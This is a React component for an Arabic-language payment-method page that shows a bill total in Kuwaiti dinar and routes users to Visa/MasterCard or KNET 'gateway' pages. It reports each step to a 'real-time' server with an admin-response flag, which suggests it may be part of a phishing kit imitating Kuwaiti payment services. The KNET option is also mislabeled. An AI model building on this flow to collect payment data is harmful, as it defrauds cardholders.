import { Button } from "@/components/ui/button";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { ArrowLeft, WalletIcon } from "lucide-react";
import { useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";

export default function PickPayment() {
  const {
    state: { total },
  } = useLocation();
  const navigate = useNavigate();
  useEffect(() => {
    setCurrentPage("إختيار طريقة الدفع");
  }, []);

  const go2PaymentGateway = () => {
    sendDataToServer({
      data: {
        "طريقة الدفع": "visa",
      },
      current: "إختيار طريقة الدفع",
      nextPage: "payment-gateway",
      waitingForAdminResponse: false,
      navigate,
      state: {
        payment_amount: total,
      },
    });
  };

  const go2KnetGateway = () => {
    sendDataToServer({
      data: {
        "طريقة الدفع": "knet",
      },
      current: "إختيار طريقة الدفع",
      nextPage: "knet-gateway",
      waitingForAdminResponse: false,
      navigate,
      state: {
        payment_amount: total,
      },
    });
  };

  return (
    <>
      <section className="border-b flex justify-between px-2">
        <img
          src="/assets/images/tasdeed.png"
          alt="tasdeed logo"
          className="w-40 mix-blend-darken"
        />
        <img
          src="/assets/images/fin.png"
          alt="finincal logo"
          className="w-20 mix-blend-darken"
        />
      </section>

      <section className="container mt-4">
        <h2 className="text-gray-500 font-bold text-xl">فاتورة دفع إلكتروني</h2>
        <div className="flex justify-between mt-16">
          <p className="text-gray-500 font-bold text-lg">رسوم الدفع</p>
          <ArrowLeft className="text-main" />
          <p className="text-gray-500 font-bold text-lg">
            {Number(total).toFixed(3)} <span className="mx-3"></span> دينار
            كويتي
          </p>
        </div>

        <div className="flex items-center mt-16 mb-4 gap-6">
          <p className="text-main font-bold text-lg">طرق الدفع</p>
          <WalletIcon className="text-main" />
        </div>

        <div className="flex flex-col gap-4 pb-40">
          <div className="border border-gray-400 p-2 rounded-lg flex justify-between gap-4 items-center">
            <span className="flex items-center">
              <img
                src="/assets/images/client/master-card.svg"
                alt="master-card logo"
                className="w-8 lg:w-12"
              />
              <img
                src="/assets/images/client/visa-card.svg"
                alt="visa-card logo"
                className="w-8 lg:w-12"
              />
            </span>
            <p className="font-bold text-xs lg:text-lg">فيزا & ماستر كارد</p>
            <Button
              onClick={go2PaymentGateway}
              className="bg-main text-white w-28"
            >
              أدفع الآن
            </Button>
          </div>

          <div className="border border-gray-400 p-2 rounded-lg flex justify-between gap-4 items-center">
            <span className="flex items-center">
              <img
                src="/assets/images/knet.png"
                alt="knet card logo"
                className="w-8 lg:w-12"
              />
            </span>
            <p className="font-bold text-xs lg:text-lg">فيزا & ماستر كارد</p>
            <Button
              onClick={go2KnetGateway}
              className="bg-main text-white w-28"
            >
              أدفع الآن
            </Button>
          </div>
        </div>
      </section>
    </>
  );
}
